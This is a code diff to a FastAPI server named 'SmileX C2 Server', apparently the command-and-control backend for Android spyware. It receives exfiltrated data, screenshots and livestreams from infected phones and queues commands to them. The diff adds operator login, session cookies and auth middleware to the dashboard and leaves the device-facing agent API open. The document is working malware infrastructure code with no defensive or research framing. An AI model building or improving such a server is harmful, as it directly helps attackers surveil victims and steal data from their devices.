@@ -1,5 +1,5 @@
 from fastapi import FastAPI, Request, HTTPException
-from fastapi.responses import HTMLResponse, JSONResponse
+from fastapi.responses import HTMLResponse, RedirectResponse, JSONResponse
 from fastapi.templating import Jinja2Templates
 from database import (
     init_db, register_device, store_exfil, queue_command,
@@ -7,6 +7,11 @@ from database import (
     get_exfil_by_types, get_all_commands, get_stats,
     delete_exfil, delete_all_exfil_for_device, DATA_TYPES
 )
+from auth import (
+    auth_middleware, create_session, validate_session,
+    render_login, AUTH_USERNAME, AUTH_PASSWORD, _hash_password
+)
+from starlette.middleware.base import BaseHTTPMiddleware
 import json
 import os
 import base64
@@ -15,12 +20,49 @@ from datetime import datetime
 app = FastAPI(title="SmileX C2 Server")
 templates = Jinja2Templates(directory="templates")
 
+# ── Inject auth middleware ────────────────────────────────────
+app.add_middleware(BaseHTTPMiddleware, dispatch=auth_middleware)
+
 @app.on_event("startup")
 async def startup():
     init_db()
 
 # ─────────────────────────────────────────────────────────────
-# Agent API  (APK communicates with these endpoints)
+# Authentication
+# ─────────────────────────────────────────────────────────────
+@app.get("/login")
+async def login_page(request: Request):
+    """Render the login page (not protected by middleware)."""
+    return render_login()
+
+@app.post("/login")
+async def login_submit(request: Request):
+    """Handle login form submission."""
+    form = await request.form()
+    username = form.get("username", "")
+    password = form.get("password", "")
+
+    if username == AUTH_USERNAME and _hash_password(password) == _hash_password(AUTH_PASSWORD):
+        token = create_session()
+        response = RedirectResponse(url="/", status_code=303)
+        response.set_cookie(
+            key="session", value=token,
+            httponly=True, max_age=8 * 3600,
+            samesite="lax", path="/"
+        )
+        return response
+    else:
+        return render_login(error_msg="Invalid username or password")
+
+@app.get("/logout")
+async def logout():
+    """Clear the session cookie."""
+    response = RedirectResponse(url="/login", status_code=303)
+    response.delete_cookie("session", path="/")
+    return response
+
+# ─────────────────────────────────────────────────────────────
+# Agent API  (APK communicates with these endpoints — no auth)
 # ─────────────────────────────────────────────────────────────
 
 @app.post("/api/exfil")
@@ -73,7 +115,7 @@ async def receive_livestream(request: Request):
         raise HTTPException(status_code=400, detail=str(e))
 
 # ─────────────────────────────────────────────────────────────
-# Dashboard REST API
+# Dashboard REST API (protected — requires auth)
 # ─────────────────────────────────────────────────────────────
 
 @app.post("/api/screenshot")
@@ -94,6 +136,7 @@ async def receive_screenshot(request: Request):
         return {"status": "ok"}
     except Exception as e:
         raise HTTPException(status_code=400, detail=str(e))
+
 @app.get("/api/stats")
 async def stats():
     return get_stats()
@@ -169,7 +212,7 @@ async def ping():
     return {"pong": True}
 
 # ─────────────────────────────────────────────────────────────
-# Web Dashboard
+# Web Dashboard (protected — requires auth)
 # ─────────────────────────────────────────────────────────────
 
 @app.get("/", response_class=HTMLResponse)
